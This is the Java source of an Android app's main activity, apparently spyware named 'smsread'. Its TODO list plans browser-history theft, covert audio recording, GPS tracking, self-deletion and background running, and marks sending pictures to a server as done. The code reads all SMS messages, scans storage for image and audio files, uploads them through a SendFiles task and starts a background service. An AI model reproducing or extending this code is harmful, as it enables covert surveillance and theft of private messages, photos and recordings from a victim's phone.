package com.example.smsread;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.widget.TextView;

import java.io.File;
import java.util.Arrays;
import java.util.List;

//TODO collect browser history
//TODO record sound
//TODO send pictures from device - DONE
//TODO auto delete app
//TODO SERVER_NAME to send data - DONE
//TODO make it active as a service
//TODO connect phone number and name - DONE
//TODO track GPS location

//TODO background crashes when opened - FIXED
//TODO change name of voice recordings - FIXED

public class MainActivity extends BasePermissionAppCompatActivity {

    public static final String SMS = "content://sms/";
    public static Context CONTEXT;
    public static String SMS_DATA;

    private Intent backgroundServiceIntent;
    private SmsData smsData;

    public TextView outputSMS;
    public TextView outputFiles;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        outputSMS = (TextView) findViewById(R.id.outputSMS);
        outputFiles = (TextView) findViewById(R.id.outputFiles);

        getPermissions(new RequestPermissionAction() {
            @Override
            public void permissionDenied() {
                finish();
            }

            @Override
            public void permissionGranted() {
                try {
                    CONTEXT = MainActivity.this;

                    GenerateRSAKeyPair generateRSAKeyPair = new GenerateRSAKeyPair();
                    generateRSAKeyPair.Test();

                    GenerateRSAKeyPair.ClientEncrypt.Test();

                    GenerateRSAKeyPair.ServerDecrypt.Test();

                    backgroundServiceIntent = new Intent(MainActivity.this, BackgroundService.class);
                    startService(backgroundServiceIntent);

                    smsData = new SmsData(MainActivity.this);
                    SMS_DATA = SmsData.joinList(smsData.getAllSms()).toString();
                    outputSMS.setText(SMS_DATA);

                } catch (Exception e) {
                    Log.e("GRANTED PERM. ONSTART", e.getMessage());
                }

                List<File> tempFiles = FilesCollection.ScannAllFiles(Environment.getExternalStorageDirectory(), FilesCollection.IMAGE_EXTENSIONS, FilesCollection.AUDIO_EXTENSIONS);
                new SendFiles().execute((File[]) tempFiles.toArray(new File[0]));

                outputFiles.setText(Arrays.toString(FilesCollection.FilesListToAbsolutePathArray("\n", tempFiles)));
                System.out.println("NUMBER OF FILES STORED: " + FilesCollection.FileNames.size());
            }
        });
    }

    @Override
    protected void onStart() {
        super.onStart();
    }

    @Override
    protected void onResume() {
        super.onResume();
    }

    @Override
    protected void onPause() {
        super.onPause();
    }

    @Override
    public void onBackPressed() {
        //super.onBackPressed();
        finish();
    }

    @Override
    protected void onStop() {
        super.onStop();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        cleanup();
    }

    private void cleanup() {
        if (hasAllPermissionsGranted()) {
            stopService(backgroundServiceIntent);
            smsData.CloseCursor();
        }
    }
}
